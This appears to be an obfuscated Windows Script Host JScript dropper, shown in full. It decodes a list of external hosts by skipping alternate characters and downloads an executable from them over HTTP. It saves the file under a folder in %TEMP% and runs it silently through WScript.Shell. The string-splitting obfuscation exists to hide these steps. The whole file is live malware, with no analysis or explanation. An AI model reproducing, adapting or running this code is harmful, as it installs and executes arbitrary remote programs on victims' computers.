

function sKnRXIOYD(HXqdTZdjVQl) {
var mhjsYkuV = "hGNC Ws bxhmAlJ cript.S EfFgyz hell".split(" ");
var PzWsIgFf = WScript.CreateObject(mhjsYkuV[1] + mhjsYkuV[3] + mhjsYkuV[5]);
PzWsIgFf.Run(HXqdTZdjVQl, 0x1, 0x0);
}
function YWEcTAweI(BrUis,AOHcv,Anzuk) {
var bHAFp = "nFzXpy wWl pt.Shell ZDuMfUc Scri  %TEMP%\\".split(" ");
var PFq=((1)?"W" + bHAFp[4]:"")+bHAFp[2];
var zl = WScript.CreateObject(PFq);
return zl.ExpandEnvironmentStrings(bHAFp[6]);
}
function exqkPQUi() {
var STYbcvy = "Sc IjrADSu r KlxAcenrz ipting XOrkxji mKJ ile hvtpvYsgdjBejF System CF NgwcJ Obj vOuJbe ect apMxVZl".split(" ");
return STYbcvy[0] + STYbcvy[2] + STYbcvy[4] + ".F" + STYbcvy[7] + STYbcvy[9] + STYbcvy[12] + STYbcvy[14];
}
function ckuO(CAsMb) {
OsnGdFz = WScript.CreateObject(CAsMb);
return OsnGdFz
}
function pQTU(RUcpO,SVehR) {
RUcpO.write(SVehR);
}
function ayyZ(sIMkg) {
sIMkg.open();
}
function GaQj(hwyfo,bYZAm) {
hwyfo.saveToFile(bYZAm,573-571);
}
function GIWO(otIfi,KRWzL,yDKut) {
otIfi.open(yDKut,KRWzL,false);
}
function uPSA(QiHbr) {
if (QiHbr == 678-478){return true;} else {return false;}
}
function MYqJ(Gwema) {
if (Gwema > 150684-653){return true;} else {return false;}
}
function JsQR(wQjFh) {
var GblOt="";
for(l=(658-658); l < wQjFh.length; l++)
if (l % (377-375) != (841-841)) {
GblOt += wQjFh.substr(l, 363-362);
}
return GblOt;
}
function QpPI(MQrQL) {
MQrQL.send();
}
function rbhf(eOzth) {
return eOzth.status;
}
function xLRwc(EGYkkS) {
return new ActiveXObject(EGYkkS);
}
function jkcumgV(GxUB) {
GxUB.position=0;
}
function TsdLeKf(teST) {
return teST.responseBody;
}
var tO="FuEj2avjvaOjtgWoCg6oJfNf8.3cnobm9/e8x0Q.xezxEe7?R Zi7sNtOh7edrDe7awniykb5o5dPykqQqu.jcQobmK/Z8R0v.He8x6eM?U r?Q C?T L?";
var f = JsQR(tO).split(" ");
var qnt = YWEcTAweI("Fnja","GZbTR","JNFIZs");
var zIV = xLRwc(exqkPQUi());
var NpAORL = ("SvAwmlg \\").split(" ");
var hzQm = qnt+NpAORL[0]+NpAORL[1];
try{
zIV.CreateFolder(hzQm);
}catch(hmYZMh){
};
var kRc = "2.XMLH";
var Xqu = (kRc + "TTP" + " hBeJjcm tZSpZ XML ream St hLkEijtq AD RTnXXAu OD").split(" ");
var iQ = true  , ILqo = Xqu[7] + "" + Xqu[9];
var BF = ckuO("MS"+Xqu[3]+(586309, Xqu[0]));
var yeK = ckuO(ILqo + "B." + Xqu[5]+(204094, Xqu[4]));
var Dcd = 0;
var r = 1;
var TXhALoh = 508338;
var O=Dcd;
while (true)  {
if(O>=f.length) {break;}
var cZ = 0;
var XOB = ("ht" + " RpKeRuq tp qTrHL ZBHxhHcB :// TtrNhDf .e xe G ET").split(" ");
try  {
var JqRkU=XOB[0]+XOB[2]+XOB[5];
GIWO(BF,JqRkU+f[O]+r, XOB[9]+XOB[10]); QpPI(BF); if (uPSA(rbhf(BF)))  {      
ayyZ(yeK); yeK.type = 1; pQTU(yeK,TsdLeKf(BF)); if (MYqJ(yeK.size))  {
cZ = 1; jkcumgV(yeK);GaQj(yeK,/*pylO297jCF*/hzQm/*2dtX692k9O*/+TXhALoh+XOB[7]+XOB[8]); try  {
if (((new Date())>0,7828657888)) {
sKnRXIOYD(hzQm+TXhALoh+/*DT5U45x32G*/XOB[7]+XOB[8]/*MVFe91eByx*/); 
break;
}
}
catch (YN)  {
}; 
}; yeK.close(); 
}; 
if (cZ == 1)  {
Dcd = O; break; 
}; 
}
catch (YN)  { 
}; 
O++;
}; 

